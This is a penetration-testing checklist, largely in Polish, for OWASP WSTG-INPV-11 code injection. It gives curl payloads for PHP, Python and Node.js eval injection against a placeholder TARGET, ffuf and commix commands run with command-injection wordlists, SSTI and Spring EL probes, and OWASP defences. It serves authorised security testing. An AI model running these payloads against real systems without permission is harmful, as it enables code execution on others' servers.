# WSTG-INPV-11 — Testing for Code Injection

## Cele

- Identify injection points where you can inject code into the application
- Assess the injection severity

## KOMENDY

### PHP code injection

```bash
curl -s "https://TARGET/page?input=phpinfo()"
curl -s "https://TARGET/page?input=system('id')"
curl -s "https://TARGET/page?input=${system('id')}"
curl -s "https://TARGET/page?input=';phpinfo();//"

```

### Python code injection

```bash
curl -s "https://TARGET/eval?expr=__import__('os').system('id')"
curl -s "https://TARGET/eval?expr=exec('import os;os.system(\"id\")')"

```

### Node.js code injection

```bash
curl -s "https://TARGET/eval?expr=require('child_process').execSync('id')"

```

### commix - automatyczny skaner

```bash
commix -u "https://TARGET/page?input=test" --batch

```

## KOMENDY Z WORDLISTAMI

### fuzzdb OS command execution (code context)

```bash
ffuf -u "https://TARGET/page?input=FUZZ" -w Desktop/WSTG/fuzzdb-master/attack/os-cmd-execution/command-execution-unix.txt -mc all -o output_ffuf_code_inj.json

```

### PayloadsAllTheThings Command Injection (powiazane)

```bash
ffuf -u "https://TARGET/page?input=FUZZ" -w "Desktop/WSTG/PayloadsAllTheThings-master/Command Injection/Intruder/command_exec.txt" -mc all -o output_ffuf_cmd_exec.json

```

### SecLists command injection

```bash
ffuf -u "https://TARGET/page?input=FUZZ" -w Desktop/WSTG/SecLists-master/Fuzzing/command-injection-commix.txt -mc all -o output_ffuf_commix.json

```

## WERYFIKACJA MANUALNA (Burp Suite / Przegladarka / DevTools)

1. Zidentyfikuj parametry ktore moga byc ewaluowane (eval, exec, include)
2. Testuj wstrzykiwanie kodu specyficznego dla jezyka backendu
3. Sprawdz odpowiedzi pod katem wykonania kodu (output komendy id, phpinfo)
4. Testuj rozne enkodowania do obejscia filtrow
5. Uzyj Burp Intruder z listami payloadow


---

## CHEATSHEET OWASP — Kluczowe wskazówki

> Źródło: OWASP CheatSheetSeries — Injection_Prevention_Cheat_Sheet.md, Input_Validation_Cheat_Sheet.md

### Code Injection vs Command Injection

- **Code Injection**: wstrzyknięcie kodu w jezyku aplikacji (PHP, Python, JS, Ruby)
- **Command Injection (INPV-12)**: wstrzyknięcie komend OS (shell commands)
- Code injection = atakujacy kontroluje KOD APLIKACJI, nie komendy systemu

### Niebezpieczne funkcje — per jezyk

- **PHP**: `eval()`, `assert()`, `preg_replace('/e')`, `include()`, `require()`, `create_function()`
- **Python**: `eval()`, `exec()`, `compile()`, `__import__()`, `os.system()`
- **JavaScript/Node**: `eval()`, `Function()`, `setTimeout(string)`, `setInterval(string)`, `vm.runInContext()`
- **Ruby**: `eval()`, `instance_eval()`, `class_eval()`, `send()`, `public_send()`
- **Java**: `Runtime.exec()`, `ScriptEngine.eval()`, `ProcessBuilder`

### Obrona

- **UNIKAJ** dynamicznego wykonywania kodu — przepisz logike bez eval/exec
- **Allowlist wartosci** — jesli musisz wybierac dynamicznie, mapuj user input na dozwolone wartosci
- **Sandboxed execution**: jesli dynamiczny kod jest ABSOLUTNIE wymagany — izoluj go
  - Docker/container, seccomp, AppArmor, restricted execution environment
- **Waliduj typy danych** scisle — nie akceptuj stringow gdzie oczekiwane sa liczby/bool
- **Input validation**: allowlist > denylist, ogranicz dlugosc, zakres, format

### Typowe wektory

- Template injection (SSTI): Jinja2 `{{7*7}}`, Twig `{{7*7}}`, Freemarker `${7*7}`
- Deserialization: niebezpieczna deserializacja obiektow (Java, Python pickle, PHP unserialize)
- Dynamic include/require: `include($_GET['page'])` → LFI/RFI
- Expression Language injection: Spring EL `${T(java.lang.Runtime).getRuntime().exec('cmd')}`

### Testowanie

- Wstrzyknij payloady specyficzne dla jezyka: `${7*7}`, `{{7*7}}`, `<%= 7*7 %>`
- Sprawdz czy wynik (49) pojawia sie w odpowiedzi — potwierdza code injection
- Testuj time-based: `${T(Thread).sleep(5000)}` — opoznienie potwierdza wykonanie

## ROZSZERZENIA BURP SUITE

| Rozszerzenie | Opis | Link |
|---|---|---|
| Backslash Powered Scanner | Wykrywanie nieznanych klas injection przez analize odpowiedzi | [GitHub](https://github.com/PortSwigger/backslash-powered-scanner) |
